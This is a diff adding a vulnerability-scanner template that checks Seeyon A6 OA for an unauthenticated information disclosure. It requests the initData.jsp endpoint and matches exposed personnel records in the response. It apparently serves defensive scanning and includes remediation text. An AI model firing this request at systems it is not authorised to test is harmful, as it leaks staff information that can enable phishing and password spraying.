@@ -1,0 +1,34 @@
+id: seeyon-a6-initdata-information-disclosure
+
+info:
+  name: Seeyon A6 initData.jsp Information Disclosure
+  author: bl
+  severity: medium
+  description: Seeyon A6 exposes the initData.jsp endpoint, which may disclose user information without proper access control. An attacker can access the endpoint to obtain personnel information from the affected system.
+  impact: Successful exploitation may allow an attacker to enumerate user information, facilitating subsequent attacks such as password spraying, phishing, or privilege escalation.
+  remediation: Upgrade Seeyon A6 to the latest secure version, restrict unauthenticated access to the affected endpoint, and enforce proper authentication and authorization controls.
+  reference:
+    - https://www.seeyon.com/
+  metadata:
+    vendor: Seeyon
+    product: A6
+    max-request: 1
+  tags: 致远互联-OA
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/yyoa/common/selectPersonNew/initData.jsp?trueName=1"
+
+    redirects: true
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - "personList[0]= new Person("
